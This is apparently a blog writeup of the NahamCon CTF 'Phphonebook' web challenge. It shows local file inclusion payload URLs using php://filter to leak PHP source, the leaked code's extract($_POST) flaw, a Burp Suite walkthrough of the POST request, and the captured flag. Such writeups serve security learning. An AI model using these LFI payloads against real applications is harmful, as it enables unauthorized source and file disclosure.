---
title: phphonebook
post_title: Phphonebook Writeup - NahamCon CTF
categories:
- blog
- writeups
- NahamConCTF
tags:
- ctf
- writeup
- nahamcon
- web
---

This is a writeup for Phphonebook web challenge from NahamCon CTF.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/1.png)

<http://jh2i.com:50002>

This is a web challenge which we will exploit [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerability.

Once we open the url of the challenge we will find the below page.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/2.png)

Which tells us that we are in  `/index.php/?file=` and The phonebook is located at `phphonebook.php`

If we go to <https://jh2i.com:50002/phphonebook.php> we will find nothing interesting. It's just a text box and a submit button giving back no response.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/3.png)

So lets go back and try to include phphonebook.php in the /index.php/ page using the 'file' parameter.

<https://jh2i.com:50002/index.php/?file=phphonebook.php>

It worked! and phphonebook.php is included and interpreted in the /index.php page. Now lets go search for any technique to abuse the local file inclusion to get the contents/source code of `phphonebook.php` file without it's being interpreted by the server to see whats inside it.

You will find more than one technique using php filters to retrieve the source code through local file inclusion.

<http://jh2i.com:50002/index.php/?file=php://filter/convert.base64-encode/resource=phphonebook.php>


The above one will retrieve you the source code but its base64-encoded. You are free to go decode it and see what you can do with it.
 

`PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5QaHBob25lYm9vazwvdGl0bGU+CiAgICA8bGluayBocmVmPSJtYWluLmNzcyIgcmzk1MWkyZy
.
.
.
5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw+`

Or you can simply use a php filter to convert it to UTF format using the below url. 

<http://jh2i.com:50002/index.php/?file=php://filter/convert.iconv.utf-8.utf-16le/resource=phphonebook.php>

```html
 <!DOCTYPE html><html lang="en">  <head>    <meta charset="utf-8">    <title>Phphonebook</title>    <link href="main.css" rel="stylesheet">  </head>  <body class="bg">    <h1 id="header"> Welcome to the Phphonebook </h1>    <div id="im_container">      <img src="book.jpg" width="50%" height="30%"/>      <p class="desc">      This phphonebook was made to look up all sorts of numbers! Have fun...      </p>    </div><br><br>    <div>      <form method="POST" action="#">        <label id="form_label">Enter number: </label>        <input type="text" name="number">        <input type="submit" value="Submit">      </form>    </div>    <div id="php_container">    <?php      extract($_POST);     if (isset($emergency)){      echo(file_get_contents("/flag.txt"));     }    ?>  </div>  </br>  </br>  </br><div style="position:fixed; bottom:1%; left:1%;"><br><br><br><br><b> NOT CHALLENGE RELATED:</b><br>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!<p><img width=600px src="https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png"></p></div>  </body></html>
```

After sending the payload we will get the source code of `phphonebook.php` but it needs to be beautified. So let's copy the source code and go to <https://beautifier.io/> then select Beautify HTML, paste the code and click on Beautify code.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/4.png)

Once it has been beautified, you can see the php line of code which extracts a POST request parameters and checks if a parameter called 'emergency' exists or not. If it exist, then it will echo the contents of the `flag.txt` file which we are looking for.

Lets craft a POST request with the 'emergency' parameter included and see what happens.

To manipulate and send custom requests we have two options, the web browser dev tools or we can use Burpsuite. I'm going to use Burpsuite just to be familiar with it and see how it works and how to use it to send custom requests. Lets open burpsuite to intercept, manipulate and send custom requests to the web server of the challenge.

Before using Burpsuite we should configure the browser to use it as a proxy. I'm using FoxyProxy firefox extension with Burpsuite settings configured. Open the browser then enable Burpsuite proxy settings. then open <http://jh2i.com:50002/phphonebook.php> in the browser.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/5.png)

Now go back to Burpsuite, open Proxy tab then you will see that the request to the web server has been intercepted. What we found is the request is a GET not a POST request, but what we want to do is to send a POST request with the 'emergency' parameter included.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/6.png)

So right click anywhere on the request, then choose Send to repeater or simply just click `ctrl+r`. Go to Repeater tab. On the request Raw tab text box, change the GET method to POST, then add the 'emergency' POST parameter to the body of the request. 

Now an additional tab called 'Params' will be automatically shown which includes all the parameters of the request which in our case is just the 'emergency' parameter.  

After sending the request, a response is received with the flag as shown.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/7.png)

`flag{phon3_numb3r_3xtr4ct3d}`
